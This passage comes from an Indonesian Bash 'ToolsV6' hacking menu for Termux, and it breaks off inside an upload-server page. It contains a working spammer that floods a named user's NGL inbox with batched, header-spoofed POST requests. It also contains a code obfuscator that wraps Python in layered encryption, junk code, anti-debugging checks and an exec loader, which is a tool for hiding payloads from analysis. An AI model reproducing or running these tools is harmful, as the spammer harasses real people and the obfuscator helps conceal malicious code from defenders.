            echo -e "${r}❌ Kolom ini tidak boleh kosong"
        fi
    done
}
main() {
    animate_banner
    echo -e "${y}🚀 Sedang menyiapkan alat."
    sleep 2
    echo -e "${p}────────────────────────────"
    echo -e "${c} 📝 Enter Target Details 📝"
    echo -e "${p}────────────────────────────"
    username=$(validate_username)
    message=$(validate_text)
    count=$(validate_number)
    echo -e "${n}────────────────────────────"
    echo -e "${p}     📋 Summary 📋"
    echo -e "${n}────────────────────────────"
    echo -e "${r}├─ ${g}Target : ${c}@$username"
    echo -e "${r}├─ ${g}Message : ${c}\"$message\""
    echo -e "${r}└─ ${g}Quantity : ${c}$count messages"
    echo -e "${n}────────────────────────────"
    echo -e "${y}"
    read -r -p "Mulai mengirim? (y/n) : " confirm
    echo ""
    if [[ ! "$confirm" =~ ^[Yy]$ ]]; then
        clear
        echo ""
        echo -e "${r}[ ${g}x ${r}]${c} Konfirmasi dibatalkan..!!"
        echo ""
    fi
    echo -e "${r}[ ${g}✓ ${r}]${b} Sedang proses pengiriman..!!"
    echo ""
    local success_count=0
    local fail_count=0
    for ((i=0; i<${count}; i++)); do
        if send_message "$username" "$message" "$i" "$count"; then
            ((success_count++))
        else
            ((fail_count++))
        fi
        sleep $((1 + RANDOM % 3))
    done
    clear
echo "
⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠉⠉⣶⣶⣦⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣶⠉⠉⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣀⣀⣿⣿⣿⣀⣀⣀⣀⣀⣀⣀⣀⣿⣿⣿⣀⣀⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⣿⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⣿⣿⣿⣿⣿⠀⠀⠀
⣤⣤⣼⣿⣿⣿⣿⣿⣤⣤⣤⣿⣿⣿⣿⣿⣿⣿⣿⣤⣤⣤⣿⣿⣿⣿⣿⣤⣤⣤
⣿⣿⣿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⣿⣿⣿
⣿⣿⡇⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⣿⣿⣿
⣿⣿⡇⠀⠀⢸⣿⣿⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⣿⣿⡇⠀⠀⣿⣿⣿
⠛⠛⠃⠀⠀⠘⠛⠛⣤⣤⣤⣤⣤⡀⠀⠀⢠⣤⣤⣤⣤⣤⠛⠛⠃⠀⠀⠛⠛⠛
⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⡇⠀⠀⢸⣿⣿⣿⣿⣿⠀⠀
" | lolcat
echo -e "${g}===============${y}[ ${r}SPAMMER,IN NGL ${y}]${g}==============="
    echo ""
    echo -e "${r}[ ${g}✓ ${r}]${y} Pengiriman sukses : $success_count"
    echo -e "${r}[ ${g}x ${r}]${c} Pengiriman gagal : $fail_count"
    echo -e "${r}[ ${g}+ ${r}]${p} Total dikirim : $count"
    echo ""
}
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    echo ""
    trap 'clear; echo -e "${r}[ ${g}x ${r}]${g} Keluar Dari Script..!!"; pkill -9 -f com.termux' INT TERM
    echo ""
    main
fi
;;  
 4|04)
g='\033[32;1m'
r='\033[31;1m'
y='\033[33;1m'
c='\033[1;36m'
p='\033[35;1m'
n='\033[0m'
clear
cok="ansi-rounded"
echo "
▗▖  ▗▖ ▗▄▄▖▗▖    ▗▄▄▖▗▄▄▖  ▗▄▖ ▗▖  ▗▖▗▖  ▗▖▗▄▄▄▖▗▄▄▖ 
▐▛▚▖▐▌▐▌   ▐▌   ▐▌   ▐▌ ▐▌▐▌ ▐▌▐▛▚▞▜▌▐▛▚▞▜▌▐▌   ▐▌ ▐▌
▐▌ ▝▜▌▐▌▝▜▌▐▌    ▝▀▚▖▐▛▀▘ ▐▛▀▜▌▐▌  ▐▌▐▌  ▐▌▐▛▀▀▘▐▛▀▚▖
▐▌  ▐▌▝▚▄▞▘▐▙▄▄▖▗▄▄▞▘▐▌   ▐▌ ▐▌▐▌  ▐▌▐▌  ▐▌▐▙▄▄▖▐▌ ▐▌

           Development : Thxyzz404
" | boxes -d "$cok" | lolcat
echo -e "${g}"
read -p "MASUKKAN USERNAME NGL TARGET : " USERNAME
echo -e "${c}"
read -p "MASUKKAN PESAN UNTUK TARGET : " PESAN
echo -e "${y}"
read -p "MASUKKAN JUMLAH SPAM : " JUMLAH_BATCH
if [[ -z "$USERNAME" || -z "$PESAN" || -z "$JUMLAH_BATCH" ]]; then
    clear 
    echo ""
    echo -e "${r}[!] Error : Semua field harus diisi!"
    echo ""
    pkill -9 -f com.termux
fi
if ! [[ "$JUMLAH_BATCH" =~ ^[0-9]+$ ]]; then
    clear 
    echo ""
    echo -e "${r}[!] Error : Jumlah harus angka!"
    echo ""
    pkill -9 -f com.termux
fi
encode_url() {
    local string="$1"
    local length="${#string}"
    local result=""
    local c
    for ((i = 0; i < length; i++)); do
        c="${string:i:1}"
        case "$c" in
            [a-zA-Z0-9.~_-]) result+="$c" ;;
            ' ') result+="%20" ;;
            '!') result+="%21" ;;
            '"') result+="%22" ;;
            '#') result+="%23" ;;
            '$') result+="%24" ;;
            '&') result+="%26" ;;
            "'") result+="%27" ;;
            '(') result+="%28" ;;
            ')') result+="%29" ;;
            '*') result+="%2A" ;;
            '+') result+="%2B" ;;
            ',') result+="%2C" ;;
            '/') result+="%2F" ;;
            ':') result+="%3A" ;;
            ';') result+="%3B" ;;
            '=') result+="%3D" ;;
            '?') result+="%3F" ;;
            '@') result+="%40" ;;
            '[') result+="%5B" ;;
            ']') result+="%5D" ;;
            *) printf -v hex '%%%02X' "'$c"
               result+="$hex"
               ;;
        esac
    done
    echo "$result"
}
PESAN_ENC=$(encode_url "$PESAN")
TEMP_DIR="${HOME}/.ngl_temp"
mkdir -p "$TEMP_DIR"
clear 
echo ""
echo -e "${r}==============================================="
echo ""
echo -e "${g}Mengirim ke : $USERNAME"
echo "Pesan : $PESAN"
echo "Jumlah batch : $JUMLAH_BATCH (1 batch = 5 pesan)"
echo "Total pesan : $((JUMLAH_BATCH * 5))"
echo ""
echo -e "${r}==============================================="
echo ""
echo -e "${r}[ ${g}+ ${r}]${c} Memulai dalam 3 detik..!!"
sleep 1
echo -e "${r}[ ${g}+ ${r}]${c} Memulai dalam 2 detik..!!"
sleep 1
echo -e "${r}[ ${g}+ ${r}]${c} Memulai dalam 1 detik..!!"
sleep 1
SUCCESS_COUNT=0
FAIL_COUNT=0
TOTAL_SENT=0
BATCH_NUMBER=1
send_batch() {
    local batch_num=$1
    local username=$2
    local message=$3
    echo -e "${p}"
    echo "───────────────────────────────────────────────"
    echo "  BATCH $batch_num - Mengirim 5 pesan sekaligus"
    echo "───────────────────────────────────────────────"
    echo -e "${n}" 
    local pids=()
    for ((j=1; j<=5; j++)); do
        local device_id="device_$(date +%s%N)_$RANDOM"
        (
            response=$(curl -s -w "%{http_code}" -o "${TEMP_DIR}/ngl_response_$$_$j" -X POST \
                -H "User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36" \
                -H "Accept: application/json, text/plain, */*" \
                -H "Accept-Language: en-US,en;q=0.9" \
                -H "Content-Type: application/x-www-form-urlencoded" \
                -H "Origin: https://ngl.link" \
                -H "Referer: https://ngl.link/$username" \
                -H "Sec-Fetch-Dest: empty" \
                -H "Sec-Fetch-Mode: cors" \
                -H "Sec-Fetch-Site: same-origin" \
                -d "username=$username&question=$message&deviceId=$device_id&gameSlug=&referrer=" \
                "https://ngl.link/api/submit" 2>/dev/null)
            echo "$response $j" >> "${TEMP_DIR}/ngl_batch_$$.txt"
        ) &
        pids+=($!)
        echo -e "  [Batch $batch_num - Pesan $j] ${y}Mengirim..!!"
        sleep 0.1
    done
    for pid in "${pids[@]}"; do
        wait $pid
    done
    local success_in_batch=0
    local fail_in_batch=0
    while read -r line; do
        local response_code=$(echo $line | awk '{print $1}')
        local message_num=$(echo $line | awk '{print $2}')
        if [[ "$response_code" == "200" ]]; then
            echo -e "  [Batch $batch_num - Pesan $message_num] ${g}Sukses ✓"
            ((SUCCESS_COUNT++))
            ((success_in_batch++))
        else
            echo -e "  [Batch $batch_num - Pesan $message_num] ${r}Gagal ✗ (kode: $response_code)"
            ((FAIL_COUNT++))
            ((fail_in_batch++))
        fi
        ((TOTAL_SENT++))
    done < "${TEMP_DIR}/ngl_batch_$$.txt"
    rm -f "${TEMP_DIR}/ngl_batch_$$.txt" "${TEMP_DIR}/ngl_response_$$_"*
    echo -e "${p}  └─ Batch $batch_num selesai : ${g}$success_in_batch sukses${c}, ${r}$fail_in_batch gagal"
    echo ""
}
for ((batch=1; batch<=JUMLAH_BATCH; batch++)); do
    send_batch $batch "$USERNAME" "$PESAN_ENC"
    echo -e "${r}[ ${g}+ ${r}]${c} Progress : $batch/$JUMLAH_BATCH batch"
    echo -e "${r}[ ${g}+ ${r}]${c} Total dikirim : $TOTAL_SENT pesan"
    echo -e "${r}[ ${g}+ ${r}]${c} Sukses : $SUCCESS_COUNT | Gagal : $FAIL_COUNT"
    echo ""
    if [ $batch -lt $JUMLAH_BATCH ]; then
        echo -e "${y}[ ✓ ] Menunggu 2 detik sebelum batch berikutnya..!!"
        sleep 2
    fi
done
rm -f "${TEMP_DIR}/ngl_"* 2>/dev/null
echo -e "${g}"
echo "==============================================="
echo "             PROSES SELESAI                   "
echo "==============================================="
echo -e "${n}"
echo -e "Target : ${r}$USERNAME"
echo -e "Jumlah batch : ${c}$JUMLAH_BATCH"
echo -e "Total pesan dikirim : ${y}$TOTAL_SENT"
echo -e "${g}Pesan sukses : $SUCCESS_COUNT"
echo -e "${p}Pesan gagal : $FAIL_COUNT"
if [ $TOTAL_SENT -gt 0 ]; then
    SUCCESS_RATE=$((SUCCESS_COUNT * 100 / TOTAL_SENT))
    echo -e "Tingkat keberhasilan : ${g}$SUCCESS_RATE%"
    echo ""
fi
if [ $FAIL_COUNT -eq 0 ] && [ $SUCCESS_COUNT -gt 0 ]; then
    echo -e "${c}[✓] Excellent! Semua pesan terkirim sukses!"
elif [ $FAIL_COUNT -lt $SUCCESS_COUNT ]; then
    echo -e "${y}[!] Good! sebagian besar pesan terkirim."
else
    echo -e "${r}[!] Mungkin ada masalah dengan target atau koneksi."
fi
;;
*)
echo ""
echo -e "${y}Pilihan Tidak Valid...!!"
sleep 2
;;
esac
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$all" == "22" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Hacking !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
g="\033[32;1m"
c="\033[36;1m"
r="\033[31;1m"
y="\033[33;1m"
p="\033[35;1m"
mek="ansi-rounded"
URLS=()
FILES=()
clear
tmp() {
cowsay -f eyes 'Upload foto URL' | boxes -d "$mek" | lolcat
}
file_upload() {
 local file="$1"
  if [ ! -f "$file" ]; then
     echo ""
     echo -e "${r}✗ File tidak ditemukan : $file "
     sleep 2
        return 1
     fi
     name=$(basename "$file")
     size=$(du -h "$file" | cut -f1)
     echo -e "${y}📤 Mengupload file..!!${c}"
     echo -e "  Nama : $name"
     echo -e "  Ukuran : $size"
     echo -e "  Server : x0.at"
     echo ""
     local response=$(curl -s -F "file=@$file" "https://x0.at")
      if [[ $response == https://x0.at/* ]]; then
        echo -e "${g}✅ Upload berhasil! "
        echo -e "${g}🔗 URL : $response "
        echo ""
            URLS+=("$response")
            FILES+=("$file")
            return 0
         else
            echo -e "${r}❌ Upload gagal!${p} "
            echo -e "Response : $response"
            echo
            return 1
         fi
}
show_urls() {
  if [ ${#URLS[@]} -eq 0 ]; then
     echo -e "${p}📭 Belum ada file yang diupload."
       return
    fi
      echo -e "${c}HASIL UPLOAD "
      echo ""
      for i in "${!URLS[@]}"; do
        echo -e "${y}File $((i + 1))${g}"
        echo -e "  Nama : $(basename "${FILES[$i]}")"
        echo -e "  URL : ${URLS[$i]}"
        echo ""
   done
}
menu() {
 while true; do
     tmp
        if [ ${#URLS[@]} -gt 0 ]; then
            echo -e "${c}📋 File yang sudah diupload : ${#URLS[@]} file..!! "
            echo ""
        fi
echo ""
echo -e "${r}[ ${g}1 ${r}]${y} Upload file"
echo -e "${r}[ ${g}2 ${r}]${y} Lihat URL hasil upload"
echo -e "${r}[ ${g}3 ${r}]${y} Hapus semua history"
echo -e "${r}[ ${g}4 ${r}]${y} Keluar"
echo -e "${c}"
read -p "Masukkan pilihan (1-4) : " choice
   case $choice in
         1)
             echo -e "${y}"
             read -e -p "Masukkan path file : " filepath
               if [ -n "$filepath" ]; then
                   file_upload "$filepath"
                   echo ""
                   echo -e "${c}Tekan Enter untuk melanjutkan..."
                   read
                   clear 
               fi
                  ;;
         2)
             echo ""
             show_urls
             echo ""
             echo -e "${c}Tekan Enter untuk melanjutkan..."
             read
             clear
               ;;
         3)
             URLS=()
             FILES=()
             echo ""
             echo -e "${g}✅ History berhasil dihapus."
             sleep 2
             clear 
               ;;
         4)
             echo ""
             echo -e "${r}Terima kasih telah menggunakan!"
             echo ""
             break 1
               ;;
            *)
                echo ""
                echo -e "${p}Pilihan tidak valid! "
                sleep 2
                clear 
                 ;;
          esac
    done
}
menu
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$all" == "23" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Hacking !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
SAVE_DIR="/sdcard/ENCRIPSI_PYTHON"
echo "
⣿⣿⣿⣿⣿⣿⣿⣿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠈⠉⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀
⣿⣿⣿⣿⣿⣿⣿⡇⠀⢰⣶⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⠀
⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⠀
⣿⣿⡿⠿⠛⠛⠛⠓⠒⠒⠒⠒⠒⠒⠂⠀⠀⠀⠀⠀⠀⢸⡿⠿⠿⠿⢿⣿⣿⣿⠀
⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠙⣿⣿⠀
⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠇⠀⠀⠀⠀⠀⢸⣿⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡴⠋⠀⠀⠀⠀⠀⠀⠈⣿⠀
⠀⠀⠀⠀⠀⠀⠀⢀⡴⠚⠛⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀
⡀⠀⠀⠀⠀⠀⠀⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠀
⣧⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⠀
⣿⣷⣤⣤⣤⣤⣤⡇⠀⠀⠀⠀⠀⠀⢠⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣴⣿⣿⣿⠀
⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⠀
⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢾⣿⡇⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿

    Developer : Thxyzz404 " | lolcat
echo ""
echo "Contoh input pengguna : /sdcard/Folder/File_Tujuan.py"
echo ""            
read -p "Masukkan path file : " file
echo ""

if [ ! -f "$file" ]; then
    clear 
    echo ""
    echo "❌ File tidak ditemukan!"
    echo ""
fi
read -p "Masukkan output file [ contoh : Obf ] : " output
echo ""
mkdir -p "$SAVE_DIR"
if [ -z "$output" ]; then
    output="Obf"
fi
output_pyc="$SAVE_DIR/${output}.py"
echo "🔐 Proses Enkripsi + Kompilasi dimulai."
echo ""
python3 -c "
import zlib
import hashlib
import random
import marshal
import sys
import os
import base64
import time
import struct
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
from cryptography.fernet import Fernet
import secrets
import py_compile
def _anti_debug():
    try:
        if sys.gettrace() is not None:
            print(\"❌ DEBUGGING TERDETEKSI — FILE DIHENTIKAN\")
            sys.exit(9)
        bad_env = [\"PYCHARM\", \"VSCODE\", \"DEBUG\", \"TRACE\"]
        for k, v in os.environ.items():
            for b in bad_env:
                if b in k.upper() or b in str(v).upper():
                    print(\"❌ DEBUGGING ENV TERDETEKSI\")
                    sys.exit(9)
    except:
        pass
class XyntrixStrongEncryptor:
    def __init__(self, key_seed):
        self.key_seed = key_seed.encode('utf-8')
        self.master_key = hashlib.pbkdf2_hmac(
            'sha256', 
            self.key_seed, 
            b'xyntrix_salt', 
            100000,
            32
        )      
        fernet_key = hashlib.sha256(self.key_seed * 3).digest()
        self.fernet = Fernet(base64.urlsafe_b64encode(fernet_key))
    def encrypt_chacha20(self, data):
        chacha = ChaCha20Poly1305(self.master_key)
        nonce = os.urandom(12)       
        ciphertext = chacha.encrypt(nonce, data, None)      
        return nonce + ciphertext    
    def encrypt_fernet(self, data):
        return self.fernet.encrypt(data)    
    def encrypt_hybrid(self, data):
        if isinstance(data, str):
            data = data.encode('utf-8')       
        compressed = zlib.compress(data, 9)       
        chacha_encrypted = self.encrypt_chacha20(compressed)       
        fernet_encrypted = self.encrypt_fernet(chacha_encrypted)       
        return base64.b85encode(fernet_encrypted).decode('ascii')
def hex_to_special_chars(hex_text):
    hex_to_special = {
        '0': 'E͐', '1': '͙', '2': '͏', '3': '͂', '4': '͆', '5': '͕', 
        '6': '͓', '7': '̓', '8': '́', '9': '͔', 'a': 'ͅ', 'b': '̝', 
        'c': '̈', 'd': '͌', 'e': '͍', 'f': '̈́'
    }
    result = \"\"
    for char in hex_text.lower():
        result += hex_to_special.get(char, char)
    return result
def generate_useful_spam():
    spam_lines = []
    for i in range(500):
        spam_lines.append(f\"_var_{i:04d} = {random.randint(1000, 9999)}\")
    for i in range(400):
        spam_lines.append(f\"def _func_{i:04d}(x):\")
        spam_lines.append(f\"    return x * {random.randint(2, 10)} + {random.randint(1, 100)}\")
    for i in range(400):
        spam_lines.append(f\"_calc_{i:04d} = ({random.randint(100, 999)} + {random.randint(10, 99)}) * {random.randint(2, 10)}\")
    for i in range(400):
        spam_lines.append(f\"_str_{i:04d} = '{\"\".join(chr(random.randint(65, 90)) for _ in range(10))}'.lower()\")
    for i in range(300):
        spam_lines.append(f\"_list_{i:03d} = [{', '.join(str(random.randint(1, 100)) for _ in range(5))}]\")
    for i in range(300):
        spam_lines.append(f\"_dict_{i:03d} = {{'key1': {random.randint(1, 100)}, 'key2': {random.randint(1, 100)}, 'key3': {random.randint(1, 100)}}}\")
    for i in range(300):
        spam_lines.append(f\"_lambda_{i:03d} = lambda x: x + {random.randint(10, 100)}\")
    for i in range(200):
        spam_lines.append(f\"class _Cls{i:03d}:\")
        spam_lines.append(f\"    value = {random.randint(1, 1000)}\")
        spam_lines.append(f\"    def get_value(self):\")
        spam_lines.append(f\"        return self.value\")    
    spam_lines.append(\"import sys as _sys_x\")
    spam_lines.append(\"import os as _os_x\")
    spam_lines.append(\"import time as _time_x\")
    spam_lines.append(\"import random as _rand_x\")
    spam_lines.append(\"import math as _math_x\")
    spam_lines.append(\"import re as _re_x\")  
    return \"\\n\".join(spam_lines)
def hide_encrypted_data(data_string):
    chunk_size = random.randint(30, 80)
    chunks = [data_string[i:i+chunk_size] for i in range(0, len(data_string), chunk_size)]
    hidden_code = \"\"
    var_names = []    
    for i, chunk in enumerate(chunks):
        var_name = f\"__x{i:04d}__\"
        var_names.append(var_name)
        hidden_code += f'{var_name}=\"{chunk}\"\\n'   
    hidden_code += f'__data__=\"\".join([{\",\".join(var_names)}])\\n'
    return hidden_code
def hide_imports():
    imports_code = [
        \"import sys as _sys_private\",
        \"import os as _os_private\", 
        \"import time as _time_private\",
        \"import zlib as _zlib_private\",
        \"import hashlib as _hashlib_private\",
        \"import base64 as _base64_private\",
        \"import marshal as _marshal_private\",
        \"from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305 as _ChaCha20Poly1305_private\",
        \"from cryptography.fernet import Fernet as _Fernet_private\"
    ]
    return \"\\n\".join(imports_code) + \"\\n\"
input_file = \"$file\"
output_base = \"$SAVE_DIR/$output\"
key_seed = secrets.token_hex(16)
print(f\"📂 Input : {input_file}\")
print(f\"📂 Output : {output_base}.py\")
print(f\"🔑 Key : {key_seed[:8]}.{key_seed[-8:]}\")
print(\"\")
try:
    print(\"📖 Membaca file.\")
    with open(input_file, 'r', encoding='utf-8') as f:
        original_code = f.read()         
    print(\"🔐 Enkripsi dengan ChaCha20-Poly1305.\")
    encryptor = XyntrixStrongEncryptor(key_seed)
    encrypted_data = encryptor.encrypt_hybrid(original_code.encode('utf-8'))
    encrypted_hex = base64.b85decode(encrypted_data).hex()
    special_encrypted_data = hex_to_special_chars(encrypted_hex)
    hidden_data_code = hide_encrypted_data(special_encrypted_data)   
    LOADER = f'''{hide_imports()}
{generate_useful_spam()}
def _security_check():
    try:
        if _sys_private.gettrace() is not None:
            _sys_private.exit(99)
        debug_env_vars = ['PYCHARM_HOSTED', 'VSCODE_PID', 'DEBUGPY', 'PYDEV_IP', 'PYDEVD_LOAD_VALUES_ASYNC']
        for var in debug_env_vars:
            if var in _os_private.environ:
                _sys_private.exit(99)              
        return True        
    except Exception as e:
        _sys_private.exit(99)
_security_check()
{hidden_data_code}
_key_seed_ = \"{key_seed}\"
_key_bytes_ = _key_seed_.encode(\"utf-8\")
_chacha_key_ = _hashlib_private.pbkdf2_hmac(
    \"sha256\", _key_bytes_, b\"xyntrix_salt\", 100000, 32
)
_fernet_key_ = _hashlib_private.sha256(_key_bytes_ * 3).digest()
_fernet_ = _Fernet_private(_base64_private.urlsafe_b64encode(_fernet_key_))
_special_to_hex_dict_ = {{
    \"E͐\": \"0\", \"͙\": \"1\", \"͏\": \"2\", \"͂\": \"3\", \"͆\": \"4\", 
    \"͕\": \"5\", \"͓\": \"6\", \"̓\": \"7\", \"́\": \"8\", \"͔\": \"9\", 
    \"ͅ\": \"a\", \"̝\": \"b\", \"̈\": \"c\", \"͌\": \"d\", \"͍\": \"e\", \"̈́\": \"f\"
}}
_hex_chars_ = []
_i_ = 0
while _i_ < len(__data__):
    _found_ = False
    for _special_char_, _hex_char_ in _special_to_hex_dict_.items():
        if __data__.startswith(_special_char_, _i_):
            _hex_chars_.append(_hex_char_)
            _i_ += len(_special_char_)
            _found_ = True
            break
    if not _found_:
        _i_ += 1
_enc_hex_ = \"\".join(_hex_chars_)
_enc_bytes_ = bytes.fromhex(_enc_hex_)
_enc_b85_ = _base64_private.b85encode(_enc_bytes_).decode(\"ascii\")
_enc_final_ = _base64_private.b85decode(_enc_b85_)
try:
    _fernet_decrypted_ = _fernet_.decrypt(_enc_final_)
    _nonce_ = _fernet_decrypted_[:12]
    _chacha_data_ = _fernet_decrypted_[12:]  
    _chacha_ = _ChaCha20Poly1305_private(_chacha_key_)
    _chacha_decrypted_ = _chacha_.decrypt(_nonce_, _chacha_data_, None)
    _decompressed_ = _zlib_private.decompress(_chacha_decrypted_)
    _code_obj_ = compile(_decompressed_.decode(\"utf-8\"), \"<PROTECTED>\", \"exec\")
    _bytecode1_ = _marshal_private.dumps(_code_obj_)
    _bytecode2_ = _marshal_private.dumps(_bytecode1_)
    _bytecode3_ = _marshal_private.dumps(_bytecode2_)
    _exec_code1_ = _marshal_private.loads(_bytecode3_)
    _exec_code2_ = _marshal_private.loads(_exec_code1_)
    _exec_code3_ = _marshal_private.loads(_exec_code2_)   
    exec(_exec_code3_)   
except Exception as e:
    print(\"❌ DECRYPTION FAILED - File corrupted or modified\")
    _sys_private.exit(1)
{generate_useful_spam()}
'''   
    final_output = \"\"
    for _ in range(3):
        final_output += generate_useful_spam() + \"\\n\\n\"
    final_output += LOADER + \"\\n\"
    for _ in range(3):
        final_output += generate_useful_spam() + \"\\n\\n\"   
    temp_py_file = f\"{output_base}_temp.py\"
    with open(temp_py_file, 'w', encoding='utf-8') as f:
        f.write(final_output)   
    pyc_file = f\"{output_base}.py\"
    print(f\"🔄 Mengkompilasi ke bytecode Python.\")
    py_compile.compile(
        file=temp_py_file,
        cfile=pyc_file,
        dfile=pyc_file,
        optimize=2
    )    
    if os.path.exists(temp_py_file):
        os.remove(temp_py_file)
    if os.path.exists(pyc_file):
        pyc_size = os.path.getsize(pyc_file)
        print(f\"✅ SUKSES! File : {pyc_file}\")
        print(f\"📁 Ukuran : {pyc_size:,} bytes\")
        print(f\"🔐 Metode : ChaCha20-Poly1305 + Fernet + Zlib\")
    else:
        print(\"❌ Gagal membuat file.\")        
except Exception as e:
    print(f\"❌ ERROR: {str(e)}\")
"
if [ $? -eq 0 ]; then
    echo ""
    echo "🎉 Proses selesai!"
    echo "📦 File tersimpan di : $output_pyc"
    echo ""
else
    echo ""
    echo "❌ Proses gagal!"
    echo ""
fi
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$all" == "24" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Hacking !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
b='\033[34;1m'
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
echo "
░█░█░█▀█░█░░░█▀█░█▀█░█▀▄
░█░█░█▀▀░█░░░█░█░█▀█░█░█
░▀▀▀░▀░░░▀▀▀░▀▀▀░▀░▀░▀▀░ " | lolcat
echo ""
echo -e "${p} Developer ${r}: ${c}Thxyzz404"
echo ""
prot=$(( (RANDOM % 7000) + 3000 ))
echo -e "${r}[ ${g}+ ${r}]${y} Generator prot..!!"
echo -e "${r}[ ${g}✓ ${r}]${c} Prot yg di dapat : ${prot}"
echo -e "${g}"
read -p "Pakai port random? (y/n) : " ran
if [[ $ran == "n" || $ran == "N" ]]; then
    echo -e "${b}"
    read -p "Masukkan prot tujuan : " rot
    PORT=$rot
else
    PORT=$prot
fi
echo ""
echo -e "${y}✅ Menggunakan port : $PORT"
echo -e "${p}"
python3 - "$PORT" << 'PYEOF'
import os
import sys
import json
import datetime
import uuid
import requests
import re
from http.server import HTTPServer, BaseHTTPRequestHandler
PORT = int(sys.argv[1])
SAVE_DIR = "uploads"
os.makedirs(SAVE_DIR, exist_ok=True)
HTML = """
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>NanzzUploader</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0c10;font-family:Arial;color:#fff;padding:20px}
.container{max-width:600px;margin:0 auto}
.box{background:rgba(20,25,45,0.9);border-radius:20px;padding:30px;border:1px solid #7c3aed}
h1{text-align:center;margin-bottom:10px;background:linear-gradient(135deg,#a855f7,#3b82f6);-webkit-background-clip:text;background-clip:text;color:transparent}
.sub{text-align:center;color:#888;margin-bottom:30px}
.upload-area{border:2px dashed #7c3aed;border-radius:15px;padding:40px;text-align:center;cursor:pointer;margin:20px 0}
.upload-area:hover{background:rgba(124,58,237,0.1)}
input{display:none}
.file-info{background:#1a1f2e;padding:12px;border-radius:10px;margin:15px 0;border-left:3px solid #a855f7}
button{width:100%;padding:15px;background:linear-gradient(95deg,#7c3aed,#3b82f6);border:none;border-radius:50px;color:#fff;font-size:16px;font-weight:bold;cursor:pointer;margin:15px 0}
button:disabled{opacity:0.5}
